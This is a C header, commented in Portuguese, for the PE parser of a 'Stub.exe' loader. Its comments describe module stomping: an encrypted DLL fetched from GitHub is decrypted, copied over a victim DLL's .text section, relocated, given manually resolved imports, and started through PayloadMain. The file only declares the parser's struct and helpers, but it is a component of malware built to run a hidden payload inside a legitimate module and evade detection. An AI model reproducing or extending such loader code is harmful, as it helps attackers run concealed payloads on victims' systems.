/* stub_pe_parser.h — PE parser para module stomping no Stub.exe (P4-alt.1).
 *
 * Parsea uma DLL em buffer (svc.dll decifrado pela cadeia transport→crypto)
 * e expõe os ponteiros / tamanhos que o stomping engine precisa para:
 *   - copiar headers + sections para o `.text` da DLL vítima
 *   - aplicar relocs com base = victim_base
 *   - resolver imports manualmente
 *   - chamar PayloadMain
 *
 * NÃO mapeia a DLL na memória do processo. Apenas indexa o buffer.
 * Validação rigorosa em todas as etapas para evitar crashes em entrada
 * malformada (importante: o blob veio cifrado de GitHub; mesmo após HMAC
 * verify queremos defesa em profundidade contra blobs adulterados).
 */
#pragma once
#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

typedef struct StubPE {
    /* Source buffer (não dono — caller dono) */
    const BYTE*  raw;
    SIZE_T       rawLen;

    /* Headers */
    IMAGE_DOS_HEADER*       dos;
    IMAGE_NT_HEADERS64*     nt;
    IMAGE_OPTIONAL_HEADER64* opt;
    IMAGE_SECTION_HEADER*   sects;     /* ponteiro p/ array de sections */
    WORD                    nSects;

    /* Tamanhos / endereços importantes */
    DWORD        sizeOfImage;          /* SizeOfImage do OptionalHeader */
    DWORD        sizeOfHeaders;        /* SizeOfHeaders do OptionalHeader */
    ULONGLONG    preferredBase;        /* ImageBase do OptionalHeader */
    DWORD        entryRVA;             /* AddressOfEntryPoint */

    /* Data Directories que a gente usa */
    DWORD        relocRVA, relocSize;  /* IMAGE_DIRECTORY_ENTRY_BASERELOC */
    DWORD        importRVA, importSize;/* IMAGE_DIRECTORY_ENTRY_IMPORT    */
    DWORD        exportRVA, exportSize;/* IMAGE_DIRECTORY_ENTRY_EXPORT    */
    DWORD        tlsRVA, tlsSize;      /* IMAGE_DIRECTORY_ENTRY_TLS       */
    DWORD        exceptionRVA, exceptionSize; /* IMAGE_DIRECTORY_ENTRY_EXCEPTION (P8.1) */

    /* Section .text resumida (para verificar fit dentro da vítima) */
    DWORD        textRVA;
    DWORD        textVirtualSize;      /* tamanho virtual do .text do payload */
    DWORD        textRawOffset;
    DWORD        textRawSize;
} StubPE;

/* Faz o parse + valida assinatura PE32+. Retorna 0 em sucesso, negativo em erro:
 *   -1 buffer NULL / pequeno demais
 *   -2 DOS magic inválido
 *   -3 NT magic ou Machine inválido (queremos AMD64)
 *   -4 SizeOfImage / NumberOfSections sanidade falha
 *   -5 .text section não encontrada
 */
int  StubPE_Parse(StubPE* out, const BYTE* raw, SIZE_T rawLen);

/* Helper: traduz RVA → ponteiro dentro do `raw` (file offset).
 * Retorna NULL se RVA estiver fora de qualquer section. */
const BYTE* StubPE_RVAToRaw(const StubPE* pe, DWORD rva);

/* Helper: encontra section por nome ASCII (max 8 chars, sem null). */
const IMAGE_SECTION_HEADER* StubPE_FindSection(const StubPE* pe, const char* name8);

#ifdef __cplusplus
}
#endif
